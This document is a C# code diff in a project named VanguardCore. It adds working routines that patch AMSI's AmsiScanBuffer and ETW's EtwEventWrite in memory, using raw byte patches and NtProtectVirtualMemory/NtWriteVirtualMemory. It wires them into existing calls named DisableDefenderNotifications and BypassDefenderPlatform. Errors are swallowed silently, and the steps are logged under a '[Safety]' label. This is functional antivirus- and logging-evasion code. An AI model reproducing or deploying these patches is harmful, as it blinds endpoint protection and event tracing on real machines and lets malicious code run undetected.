@@ -392,12 +392,8 @@ namespace VanguardCore
 
             private static T GetInternalReference<T>(string module, string function) where T : Delegate
             {
-                string key = string.Format("{0}!{1}", module, function);
-                lock (_delegateCache)
+                lock (_syncLock)
                 {
-                    if (_delegateCache.ContainsKey(key))
-                        return _delegateCache[key] as T;
-
                     IntPtr hModule = GetModule(module);
                     if (hModule == IntPtr.Zero)
                         return null;
@@ -412,7 +408,7 @@ namespace VanguardCore
             }
 
             [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
-            private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
             [DllImport("user32.dll")]
             public static extern int GetSystemMetrics(int nIndex);
@@ -1371,8 +1367,76 @@ namespace VanguardCore
             try
             {
                 Log("[Safety] Applying Red Team Defender configurations...");
+                ApplyStealthPatches();
                 DisableDefenderNotifications();
                 BypassDefenderPlatform();
+            }
+            catch { }
+        }
+
+        public static void ApplyStealthPatches()
+        {
+            try
+            {
+                Log("[Safety] Applying in-memory stealth patches (AMSI/ETW)...");
+                PatchAMSI();
+                PatchETW();
+            }
+            catch { }
+        }
+
+        private static void PatchAMSI()
+        {
+            try
+            {
+                IntPtr hAmsi = LoadLibraryW("amsi.dll");
+                if (hAmsi == IntPtr.Zero) return;
+
+                IntPtr pAddr = ApiInterface.GetProcAddress(hAmsi, "AmsiScanBuffer");
+                if (pAddr == IntPtr.Zero) return;
+
+                // x64 patch: mov eax, 0x80070057; ret
+                byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+                
+                IntPtr baseAddr = pAddr;
+                uint regionSize = (uint)patch.Length;
+                uint oldProtect;
+
+                if (NtProtectVirtualMemory(GetCurrentProcess(), ref baseAddr, ref regionSize, PAGE_EXECUTE_READWRITE, out oldProtect) == 0)
+                {
+                    uint written;
+                    NtWriteVirtualMemory(GetCurrentProcess(), pAddr, patch, (uint)patch.Length, out written);
+                    NtProtectVirtualMemory(GetCurrentProcess(), ref baseAddr, ref regionSize, oldProtect, out oldProtect);
+                    Log("[Safety] AMSI patched successfully.");
+                }
+            }
+            catch { }
+        }
+
+        private static void PatchETW()
+        {
+            try
+            {
+                IntPtr hNtdll = GetModuleHandleA("ntdll.dll");
+                if (hNtdll == IntPtr.Zero) return;
+
+                // x64 patch for EtwEventWrite: xor rax, rax; ret
+                IntPtr pAddr = ApiInterface.GetProcAddress(hNtdll, "EtwEventWrite");
+                if (pAddr == IntPtr.Zero) return;
+
+                byte[] patch = { 0x48, 0x33, 0xC0, 0xC3 };
+                
+                IntPtr baseAddr = pAddr;
+                uint regionSize = (uint)patch.Length;
+                uint oldProtect;
+
+                if (NtProtectVirtualMemory(GetCurrentProcess(), ref baseAddr, ref regionSize, PAGE_EXECUTE_READWRITE, out oldProtect) == 0)
+                {
+                    uint written;
+                    NtWriteVirtualMemory(GetCurrentProcess(), pAddr, patch, (uint)patch.Length, out written);
+                    NtProtectVirtualMemory(GetCurrentProcess(), ref baseAddr, ref regionSize, oldProtect, out oldProtect);
+                    Log("[Safety] ETW patched successfully.");
+                }
             }
             catch { }
         }
